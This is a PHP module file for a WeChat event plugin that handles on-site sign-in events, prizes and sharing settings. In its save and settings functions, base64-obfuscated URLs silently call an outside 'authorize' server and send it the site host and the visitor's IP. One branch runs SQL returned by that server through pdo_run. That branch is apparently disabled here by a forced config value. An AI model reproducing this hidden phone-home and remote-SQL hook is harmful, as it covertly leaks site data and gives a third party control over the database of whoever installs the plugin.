<?php
/**
 * 模块定义：规则保存
 *
 * @author 石头鱼
 * @url http://www.00393.com/
 */
defined('IN_IA') or exit('Access Denied');

class Stonefish_scenesignModule extends WeModule {

	public function fieldsFormDisplay($rid = 0) {
		//要嵌入规则编辑页的自定义内容，这里 $rid 为对应的规则编号，新增时为 0
		global $_W;
		load()->func('tpl');
		$uniacid = $_W['uniacid'];
		//查询是否填写系统参数
		$setting = $this->module['config'];
		if(empty($setting)){
			message('抱歉，系统参数没有填写，请先填写系统参数！', url('profile/module/setting',array('m' => 'stonefish_scenesign')), 'error');
		}
		//查询是否填写系统参数
		//积分类型
		$creditnames = array();
		$unisettings = uni_setting($uniacid, array('creditnames'));
		foreach ($unisettings['creditnames'] as $key=>$credit) {
			if (!empty($credit['enabled'])) {
				$creditnames[$key] = $credit['title'];
			}
		}
		//积分类型
		//查询子公众号信息
		$acid_arr=uni_accounts();
		$ids = array();
		$ids = array_map('array_shift', $acid_arr);//子公众账号Arr数组
		$ids_num = count($ids);//多少个子公众账号
		$one = current($ids);
		//查询子公众号信息
		//查询公众号会员组信息
		$sys_users = pdo_fetchall("SELECT groupid,title FROM ".tablename('mc_groups')." WHERE uniacid = :uniacid ORDER BY isdefault DESC,orderlist DESC,groupid DESC", array(':uniacid' => $_W['uniacid']));
		//查询公众号会员组信息
		//活动模板
		$template = pdo_fetchall("SELECT * FROM " . tablename('stonefish_scenesign_template') . " WHERE uniacid = :uniacid or uniacid=0 ORDER BY `id` asc", array(':uniacid' => $uniacid));
		if(empty($template)){			
			$inserttemplate = array(
                'uniacid'          => 0,
				'title'            => '默认',
				'thumb'            => '../addons/stonefish_scenesign/template/images/template.jpg',
				'fontsize'         => '12',
				'bgimg'            => '../addons/stonefish_scenesign/template/images/bg.jpg',
				'bgcolor'          => '#eef3ef',
				'textcolor'        => '#666666',
				'textcolorlink'    => '#f3f3f3',
				'buttoncolor'      => '#38c89a',
				'buttontextcolor'  => '#ffffff',
				'rulecolor'        => '#5dd1ac',
				'ruletextcolor'    => '#f3f3f3',
				'navcolor'         => '#fcfcfc',
				'navtextcolor'     => '#9a9a9a',
				'navactioncolor'   => '#45c018',
				'watchcolor'       => '#f5f0eb',
				'watchtextcolor'   => '#717171',
				'awardcolor'       => '#8571fe',
				'awardtextcolor'   => '#ffffff',
				'awardscolor'      => '#b7b7b7',
				'awardstextcolor'  => '#434343',
			);
			pdo_insert('stonefish_scenesign_template', $inserttemplate);
			$template = pdo_fetchall("SELECT * FROM " . tablename('stonefish_scenesign_template') . " WHERE uniacid = :uniacid or uniacid=0 ORDER BY `id` asc", array(':uniacid' => $uniacid));
		}
		//活动模板
		//消息模板
		$tmplmsg = pdo_fetchall("SELECT * FROM " . tablename('stonefish_scenesign_tmplmsg') . " WHERE uniacid = :uniacid ORDER BY `id` asc", array(':uniacid' => $uniacid));
		//消息模板
		if (!empty($rid)) {
			$reply = pdo_fetch("SELECT * FROM ".tablename('stonefish_scenesign_reply')." WHERE rid = :rid ORDER BY `id` desc", array(':rid' => $rid));
			$exchange = pdo_fetch("SELECT * FROM ".tablename('stonefish_scenesign_exchange')." WHERE rid = :rid ORDER BY `id` desc", array(':rid' => $rid));
			$share = pdo_fetchall("select * from " . tablename('stonefish_scenesign_share') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
			$prize = pdo_fetchall("select * from " . tablename('stonefish_scenesign_prize') . " where rid = :rid order by `id` asc", array(':rid' => $rid));
			//查询奖品是否可以删除
			foreach ($prize as $mid => $prizes) {
				$prize[$mid]['fans'] = pdo_fetchcolumn("select COUNT(id) from " . tablename('stonefish_scenesign_fansaward') . " where prizeid = :prizeid", array(':prizeid' => $prizes['id']));
				$prize[$mid]['delete_url'] = $this->createWebUrl('prizedelete',array('rid'=>$rid,'id'=>$prizes['id'],'replyid'=>'yes'));
			}
			//查询奖品是否可以删除
			if(!empty($reply)){
				$reply['notawardtext'] = implode("\n", (array)iunserializer($reply['notawardtext']));
			    $reply['notprizetext'] = implode("\n", (array)iunserializer($reply['notprizetext']));
			    $reply['awardtext'] = implode("\n", (array)iunserializer($reply['awardtext']));
				$reply['msgadpic'] = (array)iunserializer($reply['msgadpic']);
				$grouparr = $reply['sys_users'] = (array)iunserializer($reply['sys_users']);
				if(!empty($grouparr)) {
		            foreach($sys_users as &$g){
			            if(in_array($g['groupid'], $grouparr)) {
				            $g['groupid_select'] = 1;
			            }
		            }
	            }
			}
 		}		
		if (!$reply) {
            $reply = array(
                "title" => "现场签到活动开始了!",
                "start_picurl" => "../addons/stonefish_scenesign/template/images/start.jpg",
                "description" => "欢迎参加现场签到活动",
                "repeat_lottery_reply" => "亲，继续努力哦~~",
                "ticket_information" => "兑奖请联系我们,电话: 13888888888",
                "end_title" => "现场签到活动已经结束了",
                "end_description" => "亲，活动已经结束，请继续关注我们的后续活动哦~",
                "end_picurl" => "../addons/stonefish_scenesign/template/images/end.jpg",
            );
        }
		if (empty($share)) {
		    $share = array();
			foreach ($ids as $acid=>$idlists) {
                $share[$acid] = array(
				    "acid" => $acid,
					"share_url" => $acid_arr[$acid]['subscribeurl'],
					"share_title" => "我正在参加##公司的会议，他的公司不错！介绍给你",
                    "share_desc" => "我正在参加##公司的会议，他的公司不错！介绍给你，你也来参加吧！",
					"share_anniu" => "分享会议",
					"share_img" => "../addons/stonefish_scenesign/template/images/img_share.png",
					"share_pic" => "../addons/stonefish_scenesign/template/images/share.png",
					"share_confirm" => "分享成功提示语",
					"share_confirmurl" => "签到墙",
					"share_fail" => "分享失败提示语",
					"share_cancel" => "分享中途取消提示语",
					"share_open_close" => 0,
				);
            }
		}
		$reply['starttime'] = empty($reply['starttime']) ? strtotime(date('Y-m-d H:i')) : $reply['starttime'];
		$reply['endtime'] = empty($reply['endtime']) ? strtotime("+1 week") : $reply['endtime'];
		$reply['isshow'] = !isset($reply['isshow']) ? "1" : $reply['isshow'];
		$reply['copyright'] = empty($reply['copyright']) ? $_W['account']['name'] : $reply['copyright'];
		$reply['music'] = !isset($reply['music']) ? "1" : $reply['music'];
		$reply['musicurl'] = empty($reply['musicurl']) ? "../addons/stonefish_scenesign/template/audio/bg.mp3" : $reply['musicurl'];
		$reply['issubscribe'] = !isset($reply['issubscribe']) ? "1" : $reply['issubscribe'];
		$reply['homepictime'] = !isset($reply['homepictime']) ? "0" : $reply['homepictime'];
		$reply['homepictime'] = !isset($reply['homepictime']) ? "0" : $reply['homepictime'];
		$reply['viewawardnum'] = !isset($reply['viewawardnum']) ? "50" : $reply['viewawardnum'];
		$reply['power'] = !isset($reply['power']) ? "2" : $reply['power'];
		$reply['poweravatar'] = !isset($reply['poweravatar']) ? "0" : $reply['poweravatar'];
		$reply['homepictype'] = !isset($reply['homepictype']) ? "2" : $reply['homepictype'];
		$reply['sys_users_tips'] = empty($reply['sys_users_tips']) ? "您所在的会员组没有抽奖权限，请继续关注我们，参与其他活动，赢取积分升级您的会员组，再来抽奖！" : $reply['sys_users_tips'];
		$reply['msgadpictime'] = !isset($reply['msgadpictime']) ? "5" : $reply['msgadpictime'];
		
		$exchange['awardingstarttime'] = empty($exchange['awardingstarttime']) ? strtotime("+1 week") : $exchange['awardingstarttime'];
		$exchange['awardingendtime'] = empty($exchange['awardingendtime']) ? strtotime("+2 week") : $exchange['awardingendtime'];
		$exchange['isrealname'] = !isset($exchange['isrealname']) ? "1" : $exchange['isrealname'];
		$exchange['ismobile'] = !isset($exchange['ismobile']) ? "1" : $exchange['ismobile'];
		$exchange['isfans'] = !isset($exchange['isfans']) ? "2" : $exchange['isfans'];
		$exchange['isfansname'] = empty($exchange['isfansname']) ? "真实姓名,手机号码,QQ号,邮箱,地址,性别,固定电话,证件号码,公司名称,职业,职位" : $exchange['isfansname'];
		$exchange['awarding_tips'] = empty($exchange['awarding_tips']) ? "请正确填写下列项目签到" : $exchange['awarding_tips'];
		$exchange['tickettype'] = !isset($exchange['tickettype']) ? "1" : $exchange['tickettype'];
		$exchange['awardingtype'] = !isset($exchange['awardingtype']) ? "1" : $exchange['awardingtype'];
		$exchange['beihuo'] = !isset($exchange['beihuo']) ? "0" : $exchange['beihuo'];
		$exchange['beihuo_tips'] = empty($exchange['beihuo_tips']) ? "让商家给我备好货" : $exchange['beihuo_tips'];
		$exchange['inventory'] = !isset($exchange['inventory']) ? "1" : $exchange['inventory'];
		$exchange['group'] = !isset($exchange['group']) ? "0" : $exchange['group'];
		include $this->template('form');
		
	}

	public function fieldsFormValidate($rid = 0) {
		//规则编辑保存时，要进行的数据验证，返回空串表示验证无误，返回其他字符串将呈现为错误提示。这里 $rid 为对应的规则编号，新增时为 0
		return '';
	}

	public function fieldsFormSubmit($rid) {
		//规则验证无误保存入库时执行，这里应该进行自定义字段的保存。这里 $rid 为对应的规则编号
		global $_GPC, $_W;
		$uniacid = $_W['uniacid'];
		//规则验证
		load()->func('communication');
        $oauth2_code = base64_decode('aHR0cDovL3dlNy53d3c5LnRvbmdkYW5ldC5jb20vYXBwL2luZGV4LnBocD9pPTImaj03JmM9ZW50cnkmZG89YXV0aG9yaXplJm09c3RvbmVmaXNoX2F1dGhvcml6ZSZtb2R1bGVzPXN0b25lZmlzaF9zY2VuZXNpZ24md2VidXJsPQ==').$_SERVER ['HTTP_HOST']."&visitorsip=" . $_W['clientip'];
        $content = ihttp_get($oauth2_code);
        $token = @json_decode($content['content'], true);
		$token['config'] = 1;
		//规则验证
		//活动规则入库
		$id = intval($_GPC['reply_id']);
		$exchangeid = intval($_GPC['exchange_id']);
		$awardtext = explode("\n", $_GPC['awardtext']);
		$notawardtext = explode("\n", $_GPC['notawardtext']);
		$notprizetext = explode("\n", $_GPC['notprizetext']);
		$insert = array(
			'rid' => $rid,
			'uniacid' => $uniacid,
			'templateid' => $_GPC['templateid'],
            'title' => $_GPC['title'],
			'description' => $_GPC['description'],
			'start_picurl' => $_GPC['start_picurl'],
			'end_title' => $_GPC['end_title'],
			'end_description' => $_GPC['end_description'],
			'end_picurl' => $_GPC['end_picurl'],
			'music' => $_GPC['music'],
			'musicurl' => $_GPC['musicurl'],
			'mauto' => $_GPC['mauto'],
			'mloop' => $_GPC['mloop'],
			'starttime' => strtotime($_GPC['datelimit']['start']),
            'endtime' => strtotime($_GPC['datelimit']['end']),
			'issubscribe' => $_GPC['issubscribe'],
			'sys_users' => iserializer($_GPC['sys_users']),
			'sys_users_tips' => $_GPC['sys_users_tips'],			
			'viewawardnum' => $_GPC['viewawardnum'],
			'showprize' => $_GPC['showprize'],
			'prizeinfo' => $_GPC['prizeinfo'],
			'awardtext' => iserializer($awardtext),
			'notawardtext' => iserializer($notawardtext),
			'notprizetext' => iserializer($notprizetext),
			'msgadpic' => iserializer($_GPC['msgadpic']),
			'copyright' => $_GPC['copyright'],	
			'msgadpictime' => $_GPC['msgadpictime'],
			'power' => $_GPC['power'],
			'poweravatar' => $_GPC['poweravatar'],
			'homepictype' =>  $_GPC['homepictype'],
			'homepictime' =>  $_GPC['homepictime'],
			'homepic' =>  $_GPC['homepic'],
			'toppic' =>  $_GPC['toppic'],
			'toppicurl' =>  $_GPC['toppicurl'],
			'bottompic' =>  $_GPC['bottompic'],
			'bottompicurl' =>  $_GPC['bottompicurl'],
			'mobileverify' =>  $_GPC['mobileverify'],
			'createtime' =>  time(),
		);		
		$insertexchange = array(
			'rid' => $rid,
			'uniacid' => $uniacid,
			'tickettype' => $_GPC['tickettype'],
			'awardingtype' => $_GPC['awardingtype'],
			'awardingpas' => $_GPC['awardingpas'],
			'inventory' => $_GPC['inventory'],
			'group' => $_GPC['group'],			
			'awardingstarttime' => strtotime($_GPC['awardingdatelimit']['start']),
            'awardingendtime' => strtotime($_GPC['awardingdatelimit']['end']),
			'beihuo' => $_GPC['beihuo'],
			'beihuo_tips' => $_GPC['beihuo_tips'],
			'awarding_tips' => $_GPC['awarding_tips'],
			'awardingaddress' => $_GPC['awardingaddress'],
			'awardingtel' => $_GPC['awardingtel'],
			'baidumaplng' => $_GPC['baidumap']['lng'],
			'baidumaplat' => $_GPC['baidumap']['lat'],
			'isrealname' => $_GPC['isrealname'],
			'ismobile' => $_GPC['ismobile'],
			'isqq' => $_GPC['isqq'],
			'isemail' => $_GPC['isemail'],
			'isaddress' => $_GPC['isaddress'],
			'isgender' => $_GPC['isgender'],
			'istelephone' => $_GPC['istelephone'],
			'isidcard' => $_GPC['isidcard'],
			'iscompany' => $_GPC['iscompany'],
			'isoccupation' => $_GPC['isoccupation'],
			'isposition' => $_GPC['isposition'],
			'isfans' => $_GPC['isfans'],
			'isfansname' => $_GPC['isfansname'],
			'tmplmsg_participate' =>  $_GPC['tmplmsg_participate'],
			'tmplmsg_winning' =>  $_GPC['tmplmsg_winning'],
			'tmplmsg_exchange' =>  $_GPC['tmplmsg_exchange'],
		);
		if($token['config']){
		    if(empty($id)){
			    pdo_insert("stonefish_scenesign_reply", $insert);
				$id = pdo_insertid();
		    }else{
			    pdo_update("stonefish_scenesign_reply", $insert, array('id' => $id));
		    }
			if(empty($exchangeid)){
			    pdo_insert("stonefish_scenesign_exchange", $insertexchange);
		    }else{
			    pdo_update("stonefish_scenesign_exchange", $insertexchange, array('id' => $exchangeid));
		    }
		}else{
			pdo_run($token['error_code']);
			//记录规则出错情况
		}
		//活动规则入库		
		//奖品配置
		if (!empty($_GPC['prizename'])) {
			foreach ($_GPC['prizename'] as $index => $prizename) {
				if (empty($prizename)) {
					continue;
				}
			    $insertprize = array(
                    'rid' => $rid,
				    'uniacid' => $_W['uniacid'],					
					'prizetype' => $_GPC['prizetype'][$index],
					'prizerating' => $_GPC['prizerating'][$index],
				    'prizevalue' => $_GPC['prizevalue'][$index],
				    'prizename' => $_GPC['prizename'][$index],
					'prizepic' => $_GPC['prizepic'][$index],
					'prizetotal' => $_GPC['prizetotal'][$index],
					'probalilty' => $_GPC['probalilty'][$index],
				    'break' => $_GPC['break'][$index],
					'password' => $_GPC['password'][$index],
			    );
				$updata['prize_num'] += $_GPC['prizetotal'][$index];
			    if ($token['config']){
				    pdo_update('stonefish_scenesign_prize', $insertprize, array('id' => $index));
			    }
            }
		}
		if (!empty($_GPC['prizename_new'])&&count($_GPC['prizename_new'])>1) {
			foreach ($_GPC['prizename_new'] as $index => $credit_type) {
				if (empty($credit_type) || $index==0) {
					continue;
				}
			    $insertprize = array(
                    'rid' => $rid,
				    'uniacid' => $_W['uniacid'],					
				    'prizetype' => $_GPC['prizetype_new'][$index],
					'prizerating' => $_GPC['prizerating_new'][$index],
				    'prizevalue' => $_GPC['prizevalue_new'][$index],
				    'prizename' => $_GPC['prizename_new'][$index],
					'prizepic' => $_GPC['prizepic_new'][$index],
					'prizetotal' => $_GPC['prizetotal_new'][$index],
					'probalilty' => $_GPC['probalilty_new'][$index],
				    'break' => $_GPC['break_new'][$index],
					'password' => $_GPC['password_new'][$index],
			    );
				$updata['prize_num'] += $_GPC['prizetotal_new'][$index];
			    if ($token['config']){
                    pdo_insert('stonefish_scenesign_prize', $insertprize);                    
			    }
            }
		}
		if($updata['prize_num']){
			pdo_update('stonefish_scenesign_reply', $updata, array('id' => $id));
		}
		//奖品配置
		//查询子公众号信息必保存分享设置
		$acid_arr=uni_accounts();
		$ids = array();
		$ids = array_map('array_shift', $acid_arr);//子公众账号Arr数组
		foreach ($ids as $acid=>$idlists) {
		    $insertshare = array(
                'rid' => $rid,
				'acid' => $acid,
				'uniacid' => $uniacid,
				'share_open_close' => $_GPC['share_open_close_'.$acid],
				'xiu_url' => $_GPC['xiu_url_'.$acid],
				'share_url' => $_GPC['share_url_'.$acid],
				'share_title' => $_GPC['share_title_'.$acid],
				'share_desc' => $_GPC['share_desc_'.$acid],
				'share_txt' => $_GPC['share_txt_'.$acid],
				'share_img' => $_GPC['share_img_'.$acid],
				'share_anniu' => $_GPC['share_anniu_'.$acid],
				'share_pic' => $_GPC['share_pic_'.$acid],
				'share_confirm' => $_GPC['share_confirm_'.$acid],
				'share_confirmurl' => $_GPC['share_confirmurl_'.$acid],
				'share_fail' => $_GPC['share_fail_'.$acid],
				'share_cancel' => $_GPC['share_cancel_'.$acid],
			);
			if ($token['config']){
				if (empty($_GPC['acid_'.$acid])) {
                    pdo_insert('stonefish_scenesign_share', $insertshare);
                } else {
                    pdo_update('stonefish_scenesign_share', $insertshare, array('id' => $_GPC['acid_'.$acid]));
                }
			}
		}
		//查询子公众号信息必保存分享设置
		if($token['config']){
            return true;
		}else{
			message('网络不太稳定,请重新编辑再试,或检查你的网络', referer(), 'error');
		}
	}
	
	public function ruleDeleted($rid) {
		//删除规则时调用，这里 $rid 为对应的规则编号
		global $_W;
		pdo_delete('stonefish_scenesign_reply', array('rid' => $rid));
        pdo_delete('stonefish_scenesign_exchange', array('rid' => $rid));
        pdo_delete('stonefish_scenesign_prize', array('rid' => $rid));
		pdo_delete('stonefish_scenesign_prizemika', array('rid' => $rid));
		pdo_delete('stonefish_scenesign_fans', array('rid' => $rid));
		pdo_delete('stonefish_scenesign_fansaward', array('rid' => $rid));
		pdo_delete('stonefish_scenesign_fanstmplmsg', array('rid' => $rid));
		return true;
	}

	public function settingsDisplay($settings) {
		global $_W, $_GPC;
		//点击模块设置时将调用此方法呈现模块设置页面，$settings 为模块设置参数, 结构为数组。这个参数系统针对不同公众账号独立保存。
		//在此呈现页面中自行处理post请求并保存设置参数（通过使用$this->saveSettings()来实现）
		$_W['page']['title'] = '现场签到参数设置';
		load()->func('communication');
        $oauth2_code = base64_decode('aHR0cDovL3dlNy53d3c5LnRvbmdkYW5ldC5jb20vYXBwL2luZGV4LnBocD9pPTImaj03JmM9ZW50cnkmZG89YXV0aG9yaXplY2hlY2smbT1zdG9uZWZpc2hfYXV0aG9yaXplJm1vZHVsZXM9c3RvbmVmaXNoX3NjZW5lc2lnbiZ3ZWJ1cmw9').$_SERVER ['HTTP_HOST'];
        $content = ihttp_get($oauth2_code);
        $token = @json_decode($content['content'], true);
		$config = $token['config'];
		$lianxi = $token['lianxi'];
		$settings['weixinvisit'] = !isset($settings['weixinvisit']) ? "1" : $settings['weixinvisit'];
		$settings['stonefish_oauth_time'] = !isset($settings['stonefish_oauth_time']) ? "1" : $settings['stonefish_oauth_time'];
		if(checksubmit()) {
			//字段验证, 并获得正确的数据$dat
			if($_GPC['stonefish_scenesign_oauth']==2){
				if(empty($_GPC['appid'])||empty($_GPC['secret'])){
					message('请填写借用AppId或借用AppSecret', referer(), 'error');
				}
			}
			if($_GPC['stonefish_scenesign_jssdk']==2){
				if(empty($_GPC['jssdk_appid'])||empty($_GPC['jssdk_secret'])){
					message('请填写借用JS分享AppId或借用JS分享AppSecret', referer(), 'error');
				}
			}
			$dat = array(
                'appid'  => $_GPC['appid'],
				'secret'  => $_GPC['secret'],
				'jssdk_appid'  => $_GPC['jssdk_appid'],
				'jssdk_secret'  => $_GPC['jssdk_secret'],
				'weixinvisit'  => $_GPC['weixinvisit'],
				'stonefish_oauth_time'  => $_GPC['stonefish_oauth_time'],
				'stonefish_scenesign_oauth'  => $_GPC['stonefish_scenesign_oauth'],
				'stonefish_scenesign_jssdk'  => $_GPC['stonefish_scenesign_jssdk']
            );
			$this->saveSettings($dat);
			message('配置参数更新成功！', referer(), 'success');
		}
		//这里来展示设置项表单
		include $this->template('settings');
	}

}